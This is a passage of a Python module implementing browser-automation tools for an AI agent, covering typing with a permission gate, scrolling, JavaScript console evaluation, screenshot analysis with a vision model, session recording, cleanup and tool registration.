        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = task_id or "default"

    # Take-over: defer to the user when they hold control of the session.
    paused = _takeover_check("type", task_id=effective_task_id)
    if paused is not None:
        return paused

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Permission gate — typing into card/login fields on a new domain.
    if not confirm:
        label = _resolve_ref_label(effective_task_id, ref)
        gated = _gate_check("type", task_id=effective_task_id, context_text=label)
        if gated is not None:
            return gated

    # Use fill command (clears then types)
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    if result.get("success"):
        # Never log the typed value (may be a password/PII); log only the ref.
        browser_action_log.record_action(
            "type", status="ok", task_id=effective_task_id,
            detail={"ref": ref, "length": len(text)},
        )
        return json.dumps({
            "success": True,
            "typed": text,
            "element": ref
        }, ensure_ascii=False)
    else:
        browser_action_log.record_action(
            "type", status="error", task_id=effective_task_id,
            detail={"ref": ref, "error": result.get("error")},
        )
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }, ensure_ascii=False)


def browser_scroll(direction: str, task_id: str | None = None) -> str:
    """
    Scroll the page.

    Args:
        direction: "up" or "down"
        task_id: Task identifier for session isolation

    Returns:
        JSON string with scroll result
    """
    # Validate direction
    if direction not in ["up", "down"]:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # Single scroll with pixel amount instead of 5x subprocess calls.
    # agent-browser supports: agent-browser scroll down 500
    # ~500px is roughly half a viewport of travel.
    _SCROLL_PIXELS = 500

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        # Camofox REST API doesn't support pixel args; use repeated calls
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = task_id or "default"

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to scroll {direction}")
        }, ensure_ascii=False)

    return json.dumps({
        "success": True,
        "scrolled": direction
    }, ensure_ascii=False)


def browser_back(task_id: str | None = None) -> str:
    """
    Navigate back in browser history.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        data = result.get("data", {})
        return json.dumps({
            "success": True,
            "url": data.get("url", "")
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to go back")
        }, ensure_ascii=False)


def browser_press(key: str, task_id: str | None = None) -> str:
    """
    Press a keyboard key.

    Args:
        key: Key to press (e.g., "Enter", "Tab")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with key press result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        return json.dumps({
            "success": True,
            "pressed": key
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }, ensure_ascii=False)





def browser_console(clear: bool = False, expression: str | None = None, task_id: str | None = None) -> str:
    """Get browser console messages and JavaScript errors, or evaluate JS in the page.

    When ``expression`` is provided, evaluates JavaScript in the page context
    (like the DevTools console) and returns the result.  Otherwise returns
    console output (log/warn/error/info) and uncaught exceptions.

    Args:
        clear: If True, clear the message/error buffers after reading
        expression: JavaScript expression to evaluate in the page context
        task_id: Task identifier for session isolation

    Returns:
        JSON string with console messages/errors, or eval result
    """
    # --- JS evaluation mode ---
    if expression is not None:
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = task_id or "default"

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": msg.get("text", ""),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": err.get("message", ""),
                "source": "exception",
            })

    return json.dumps({
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }, ensure_ascii=False)


def _browser_eval(expression: str, task_id: str | None = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result."""
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    effective_task_id = task_id or "default"
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # Detect backend capability gaps and give the model a clear signal
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            return json.dumps({
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            })
        return json.dumps({
            "success": False,
            "error": err,
        })

    data = result.get("data", {})
    raw_result = data.get("result")

    # The eval command returns the JS result as a string.  If the string
    # is valid JSON, parse it so the model gets structured data.
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string

    return json.dumps({
        "success": True,
        "result": parsed,
        "result_type": type(parsed).__name__,
    }, ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: str | None = None) -> str:
    """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
    from tools.browser_camofox import _ensure_tab, _post
    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        resp = _post(f"/tabs/{tab_id}/eval", body={"expression": expression})

        # Camofox returns the result in a JSON envelope
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        return json.dumps({
            "success": True,
            "result": parsed,
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str):
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from spark_cli.config import read_raw_config
        spark_home = get_spark_home()
        cfg = read_raw_config()
        record_enabled = cfg.get("browser", {}).get("record_sessions", False)

        if not record_enabled:
            return

        recordings_dir = spark_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: str | None = None) -> str:
    """
    Get all images on the current page.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with list of images (src and alt)
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = task_id or "default"

    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            return json.dumps({
                "success": True,
                "images": images,
                "count": len(images)
            }, ensure_ascii=False)
        except json.JSONDecodeError:
            return json.dumps({
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to get images")
        }, ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: str | None = None) -> str:
    """
    Take a screenshot of the current page and analyze it with vision AI.

    This tool captures what's visually displayed in the browser and sends it
    to Gemini for analysis. Useful for understanding visual content that the
    text-based snapshot may not capture (CAPTCHAs, verification challenges,
    images, complex layouts, etc.).

    The screenshot is saved persistently and its file path is returned alongside
    the analysis, so it can be shared with users via MEDIA:<path> in the response.

    Args:
        question: What you want to know about the page visually
        annotate: If True, overlay numbered [N] labels on interactive elements
        task_id: Task identifier for session isolation

    Returns:
        JSON string with vision analysis results and screenshot_path
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import base64
    import uuid as uuid_mod
    from pathlib import Path

    effective_task_id = task_id or "default"

    # Save screenshot to persistent location so it can be shared with users
    from core.spark_constants import get_spark_dir
    screenshots_dir = get_spark_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        # Take screenshot using agent-browser
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        screenshot_args.append("--full")
        screenshot_args.append(str(screenshot_path))
        result = _run_browser_command(
            effective_task_id,
            "screenshot",
            screenshot_args,
        )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
            }, ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # Check if screenshot file was created
        if not screenshot_path.exists():
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # Convert screenshot to base64 at full resolution.
        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        # Use the centralized LLM router
        vision_model = _get_vision_model()
        logger.debug("browser_vision: analysing screenshot (%d bytes)",
                     len(_screenshot_bytes))

        # Read vision timeout from config (auxiliary.vision.timeout), default 120s.
        # Local vision models (llama.cpp, ollama) can take well over 30s for
        # screenshot analysis, so the default must be generous.
        vision_timeout = 120.0
        try:
            from spark_cli.config import load_config
            _cfg = load_config()
            _vt = _cfg.get("auxiliary", {}).get("vision", {}).get("timeout")
            if _vt is not None:
                vision_timeout = float(_vt)
        except Exception:
            pass

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "max_tokens": 2000,
            "temperature": 0.1,
            "timeout": vision_timeout,
        }
        if vision_model:
            call_kwargs["model"] = vision_model
        # Try full-size screenshot; on size-related rejection, downscale and retry.
        try:
            response = call_llm(**call_kwargs)
        except Exception as _api_err:
            from tools.vision_tools import (
                _RESIZE_TARGET_BYTES,
                _is_image_size_error,
                _resize_image_for_vision,
            )
            if (_is_image_size_error(_api_err)
                    and len(data_url) > _RESIZE_TARGET_BYTES):
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); "
                    "auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    _RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = _resize_image_for_vision(
                    screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                response = call_llm(**call_kwargs)
            else:
                raise

        analysis = (response.choices[0].message.content or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        from agent.redact import redact_sensitive_text
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        # Include annotation data if annotated screenshot was taken
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """Remove browser screenshots older than max_age_hours to prevent disk bloat.

    Throttled to run at most once per hour per directory to avoid repeated
    scans on screenshot-heavy workflows.
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
    import time
    try:
        spark_home = get_spark_home()
        recordings_dir = spark_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# Cleanup and Management Functions
# ============================================================================

def cleanup_browser(task_id: str | None = None) -> None:
    """
    Clean up browser session for a task.

    Called automatically when a task completes or when inactivity timeout is reached.
    Closes both the agent-browser/Browserbase session and Camofox sessions.

    Args:
        task_id: Task identifier to clean up
    """
    if task_id is None:
        task_id = "default"

    # Also clean up Camofox session if running in Camofox mode.
    # Skip full close when managed persistence is enabled — the browser
    # profile (and its session cookies) must survive across agent tasks.
    # The inactivity reaper still frees idle resources.
    if _is_camofox_mode():
        try:
            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # Check if session exists (under lock), but don't remove yet -
    # _run_browser_command needs it to build the close command.
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        bb_session_id = session_info.get("bb_session_id", "unknown")
        logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)

        # Stop auto-recording before closing (saves the file)
        _maybe_stop_recording(task_id)

        # Try to close via agent-browser first (needs session in _active_sessions)
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        # Now remove from tracking under lock
        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        # Cloud mode: close the cloud browser session via provider API
        if bb_session_id:
            provider = _get_cloud_provider()
            if provider is not None:
                try:
                    provider.close_session(bb_session_id)
                except Exception as e:
                    logger.warning("Could not close cloud browser session: %s", e)

        # Kill the daemon process and clean up socket directory
        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        daemon_pid = int(Path(pid_file).read_text().strip())
                        os.kill(daemon_pid, signal.SIGTERM)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    Clean up all active browser sessions.

    Useful for cleanup on shutdown.
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    # Reset cached lookups so they are re-evaluated on next use.
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_command_timeout, _command_timeout_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    _cached_command_timeout = None
    _command_timeout_resolved = False

    # Reset preflight health cache + circuit-breaker state so a fresh process
    # phase (or test) re-probes the backend instead of trusting a stale result.
    _reset_backend_health_state()


# ============================================================================
# Requirements Check
# ============================================================================

# Session-level activation flag: browser sub-tools (snapshot/click/type/…)
# are gated behind a successful browser_open call so they don't bloat the
# default tool schema. The flag persists for the lifetime of the process
# and toggles back to False only on explicit reset (tests).
_browser_session_active: bool = False


def _activate_browser_session() -> None:
    global _browser_session_active
    _browser_session_active = True


def _reset_browser_session() -> None:
    """Test helper — deactivate the session-level browser gate."""
    global _browser_session_active
    _browser_session_active = False


def check_browser_active() -> bool:
    """True only after browser_open has activated the toolset this session."""
    return _browser_session_active and check_browser_requirements()


def check_browser_requirements() -> bool:
    """
    Check if browser tool requirements are met.

    In **local mode** (no cloud provider configured): only the
    ``agent-browser`` CLI must be findable.

    In **cloud mode** (Browserbase, Browser Use, or Firecrawl): the CLI
    *and* the provider's required credentials must be present.

    Returns:
        True if all requirements are met, False otherwise
    """
    # Camofox backend — only needs the server URL, no agent-browser CLI
    if _is_camofox_mode():
        return True

    # The agent-browser CLI is always required
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
    # local browser dependency. Require a real install (global or local) so the
    # browser tool is not advertised as available when it will likely fail on
    # first use.
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # In cloud mode, also require provider credentials
    provider = _get_cloud_provider()
    if provider is not None and not provider.is_configured():
        return False

    return True


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")

    # Check requirements
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")
        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}


def _browser_open_handler(args, **kw):
    url = args.get("url", "")
    if not url:
        return tool_error("browser_open requires a 'url' argument")
    result = browser_navigate(url=url, task_id=kw.get("task_id"))
    _activate_browser_session()
    return result


registry.register(
    name="browser_open",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_open"],
    handler=_browser_open_handler,
    check_fn=check_browser_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: browser_snapshot(
        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
    check_fn=check_browser_active,
    emoji="📸",
)
registry.register(
    name="browser_a11y",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_a11y"],
    handler=lambda args, **kw: browser_a11y(
        interactive_only=args.get("interactive_only", True), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="🌳",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: browser_click(
        ref=args.get("ref", ""), task_id=kw.get("task_id"), confirm=args.get("confirm", False)),
    check_fn=check_browser_active,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: browser_type(
        ref=args.get("ref", ""), text=args.get("text", ""),
        task_id=kw.get("task_id"), confirm=args.get("confirm", False)),
    check_fn=check_browser_active,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
    check_fn=check_browser_active,
    emoji="🖥️",
)
